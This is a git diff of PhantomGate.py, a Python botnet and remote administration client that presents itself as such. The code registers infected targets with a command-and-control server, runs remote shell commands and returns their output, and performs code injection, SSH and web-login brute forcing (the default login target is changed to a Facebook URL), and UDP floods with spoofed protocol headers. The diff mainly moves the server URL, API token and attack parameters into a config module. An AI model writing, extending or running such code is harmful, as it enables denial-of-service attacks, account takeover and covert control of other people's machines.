@@ -12,8 +12,8 @@ A multi-purpose remote administration and botnet utility with features such as:
 This script is designed to be run as a standalone application, providing a command-line interface for interacting with a remote API server.
 
 Usage:
-
-    python PhantomGate.py
+    To run the PhantomGate script, use the following command in your terminal or command prompt:
+        ~$ python PhantomGate.py
 
 Main Features:
     - Registers the client (target) with a central API server
@@ -24,8 +24,11 @@ Main Features:
     - Provides system information retrieval
     - Code injection and
     - Provides file transfer and directory navigation utilities
+    - Supports command execution with output capture
+    - Handles target data management in a SQLite database
+    - Supports adaptive rate control for UDP flood attacks
 
-API Endpoints (default: http://127.0.0.1:5000):
+API Endpoints (default: {config.url}):
     /api/register_target      Register a new target
     /api/ApiCommand/<target>     Get commands for a target
     /api/Apicommand/save_output  Post command output
@@ -59,6 +62,13 @@ import time
 import sys
 import io
 import os
+
+# importing setting
+from setting import Setting
+
+# initializing settings
+config = Setting()
+config.setting_var()
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
@@ -416,41 +426,11 @@ def initUdpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
         PACKET_SIZE (int): Size of each UDP packet to send.
     """
     # default ports
-    ports = [
-        21, # FTP
-        22, # SSH
-        23, # Telnet
-        25, # SMTP
-        53, # DNS(UDP)
-        80, # HTTP
-        110, # POP3
-        123, # NTP(UDP)
-        143, # IMAP
-        161, # SNMP(UDP)
-        443, # HTTPS
-        445, # SMB
-        993, # IMAPS
-        995, # POP3S
-        3389, # RDP
-        5060, # SIP(VoIP)
-        8080, # Alternative HTTP
-    ]
-
-    # Adaptive Rate Control
-    BASE_DELAY = 0.01  
-    ADAPTIVE_THRESHOLD = 100  
-    MIN_DELAY, MAX_DELAY = 0.05, 0.1  
-    # Spoofed Protocol Data (Mimicking DNS/VoIP)
-    FAKE_HEADERS = [
-            b"\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00",  # DNS-like query
-            b"\x80\x00\x00\x00\x00\x01\x00\x00\x00\x00",  # VoIP RTP header
-            b"\x00\x00\x00\x00\x00\x00\x00\x00",  # Generic header
-            b"\x01\x02\x03\x04\x05\x06\x07\x08",  # Custom header
-        ]
+    ports = config.PORT
     # Start Threads
     threads = []
     for i in range(THREAD_COUNT):  
-        t = threading.Thread(target=send_udp_flood, args=(i, ports,TARGET_IP,PACKET_SIZE,FAKE_HEADERS,BASE_DELAY,ADAPTIVE_THRESHOLD,MIN_DELAY,MAX_DELAY), daemon=True)
+        t = threading.Thread(target=send_udp_flood, args=(i, ports,TARGET_IP,PACKET_SIZE,config.FAKE_HEADERS,config.BASE_DELAY,config.ADAPTIVE_THRESHOLD,config.MIN_DELAY,config.MAX_DELAY), daemon=True)
         t.start()
         threads.append(t)
         packet_counts[i] = 0
@@ -458,28 +438,12 @@ def initUdpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
 
 
 # setting varible
-buit_in_command = ['lib','server','excute_code','sys_info']
-apiToken = "GKEGff99ZQo3gR2gCfCaSNCZq5NgvJpe5Byb37mmer8J5FUL4kjkVwuVjfxxghoX0OBREZR7jgweCXuscYKKdeu6bxpyNDsJ65uCmDBN2rap3n5eej3pZPYKR0ROmXkDoA1FWjpCvzPDS3w81fiCMwNxfpqegwMyWvzT5Nr5vlyv7FT9oJKrlVZHutPYuWXbMyss6qWD"
+built_in_command = config.BUIT_IN_COMMAND
+apiToken = config.API_TOKEN
 
 logger = logging.getLogger(__name__)
 
-def ID(n=5):
-        """
-        Generates a random alphanumeric ID of length 5. This ID can be used
-        for creating unique identifiers for entities in the system, such as users,
-        events, or records.
-
-        Returns:
-            str: A randomly generated 5-character string consisting of uppercase letters,
-                 lowercase letters, and digits.
-        """
-        RandomID = ''.join(
-            random.choices(
-                string.ascii_uppercase + string.ascii_lowercase + string.digits, k=n
-            )
-        )
-        return RandomID
-
+#ollama run deepseek-r1:1.5b
 
 
 def injection(token,target_name,method='GET'):
@@ -500,7 +464,7 @@ def injection(token,target_name,method='GET'):
 
     try:
         if method.upper() == 'GET':
-            GET = requests.get(f'http://127.0.0.1:5000/api/injection/{target_name}', params=args)
+            GET = requests.get(f'{config.url}/api/injection/{target_name}', params=args)
             response = GET.json()
             valid = GET.status_code
 
@@ -509,7 +473,7 @@ def injection(token,target_name,method='GET'):
 
             return {'message':f'GET request failed with status code {valid}'}
         elif method.upper() == 'POST':
-            POST = requests.post('http://127.0.0.1:5000/api/injection_output_save', json=args)
+            POST = requests.post(f'{config.url}/api/injection_output_save', json=args)
             response = POST.json()
             valid = POST.status_code
 
@@ -544,7 +508,7 @@ def libApi(token,usePyload,save=True):
         }
 
     try:
-        GET = requests.get(f'http://127.0.0.1:5000/api/lib/{usePyload}', params=args)
+        GET = requests.get(f'{config.url}/api/lib/{usePyload}', params=args)
 
     except:
         return 'Error'
@@ -588,7 +552,7 @@ def CMD(com):
         str: The output of the command or an error message if execution fails.
     """
 
-    if com not in buit_in_command:
+    if com not in built_in_command:
         try:
             cmd = subprocess.run(com, shell=True, capture_output=True, text=True)
             output_bytes = cmd.stderr + cmd.stdout
@@ -629,7 +593,7 @@ def apiCommandGet(token,target_name):
     args = {"token": token,'ip': get_ip(),'os':opratingSystem()}
 
     try:
-        GET = requests.get(f'http://127.0.0.1:5000/api/ApiCommand/{target_name}',params=args)
+        GET = requests.get(f'{config.url}/api/ApiCommand/{target_name}',params=args)
 
     except:
         return 'Error'
@@ -668,7 +632,7 @@ def apiCommandPost(token,data,target_name):
         # sending cmd output and cmd id
         params['output'].append((cmd[0],output))
     
-    POST = requests.post('http://127.0.0.1:5000/api/Apicommand/save_output',json=params)
+    POST = requests.post(f'{config.url}/api/Apicommand/save_output',json=params)
     response = POST.json()
     valid = POST.status_code
 
@@ -687,7 +651,7 @@ def BotNet(target_name,apiToken):
     Returns:
         tuple: A tuple containing the botnet instructions (udpflood, bruteFroce, customBotNet) or 'empty' if no instructions are available.
     """
-    botNet = requests.get(f'http://127.0.0.1:5000/api/BotNet/{target_name}',params={'token':apiToken,'ip':get_ip(),'os':opratingSystem()})
+    botNet = requests.get(f'{config.url}/api/BotNet/{target_name}',params={'token':apiToken,'ip':get_ip(),'os':opratingSystem()})
 
     if botNet.status_code == 200:
 
@@ -727,7 +691,7 @@ def Registor(target_name, apiToken):
     print(target_name)
     try:
         # Sending the POST request to register the target
-        POST = requests.post("http://127.0.0.1:5000/api/registor_target", json=info)
+        POST = requests.post(f"{config.url}/api/registor_target", json=info)
         # Check if the status code is 200
         if POST.status_code == 200:
             targetData(command='create_target', user_name=POST.json()['target_name'])
@@ -753,7 +717,7 @@ def Instarction(target_name, apiToken):
     }
     try:
         # Sending the GET request to retrieve instructions
-        GET = requests.get(f"http://127.0.0.1:5000/api/get_instraction/{target_name}", params=info)
+        GET = requests.get(f"{config.url}/api/get_instraction/{target_name}", params=info)
         if GET.status_code == 200:
             instruction = GET.json()
             return instruction
@@ -938,7 +902,7 @@ def ssh_brute_force(password, host, port=22, username='root'):
     except Exception as e:
         print(f"Error: {e}")
         return False
-def webLogin(userName,password,userInputName,passwordInputName,url="http://example.com/login"):
+def webLogin(userName,password,userInputName,passwordInputName,url="https://web.facebook.com/?_rdc=1&_rdr#"):
     """
     Attempts to log in to a web application using the provided username and password.
     Args:
@@ -1067,14 +1031,14 @@ def main():
 
         else:
             # Handle case where no target info is available
-            user_name = ID(n=10)
+            user_name = config.ID(n=10)
             data = Registor(target_name=user_name, apiToken=apiToken)
             if data == 'error':
                 logger.info(f'Error during registration: {data}')
             else:
                 print(data)
                 if data != None:
-                    registor_target = targetData(command='create_target', ID=ID(n=5), user_name=data['target_name'])
+                    registor_target = targetData(command='create_target', ID=config.ID(n=5), user_name=data['target_name'])
                     if registor_target == "Target was created successfully":
                         logger.info(f'Target {data["name"]} was successfully registered')
                     else:
